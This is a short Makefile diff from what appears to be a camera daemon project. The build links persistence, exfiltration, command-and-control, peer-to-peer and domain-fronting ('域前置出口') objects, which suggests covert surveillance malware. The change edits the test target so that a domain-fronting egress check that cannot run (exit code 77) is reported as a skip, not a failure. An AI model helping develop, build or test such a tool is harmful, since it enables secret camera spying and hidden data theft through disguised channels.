@@ -325,14 +325,17 @@ $(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
 	      $(TLS_OBJS) $(FRONT_OBJS) $(STATIC_LD) -o $@ $(LDLIBS)
 
-test: $(TEST_BINS)
+test: $(TEST_BINS) $(CAMDBIN) $(FRONT_PROBE)
 	@fail=0; \
 	for t in $(TEST_BINS); do \
 		echo "=== $$t ==="; \
 		./$$t || fail=1; \
 	done; \
 	echo "=== verify-front（域前置出口） ==="; \
-	python3 tests/verify_front_sink.py || fail=1; \
+	python3 tests/verify_front_sink.py; frc=$$?; \
+	if [ $$frc -eq 77 ]; then \
+	  echo "  [SKIP] 环境不具备（缺产物），无法判定——非断言失败"; \
+	elif [ $$frc -ne 0 ]; then fail=1; fi; \
 	echo "=== verify-jpeg-decode（转码产物真解码） ==="; \
 	$(MAKE) verify-jpeg-decode || fail=1; \
 	echo "=== verify-v4l2-realpath（V4L2 真设备 ABI） ==="; \
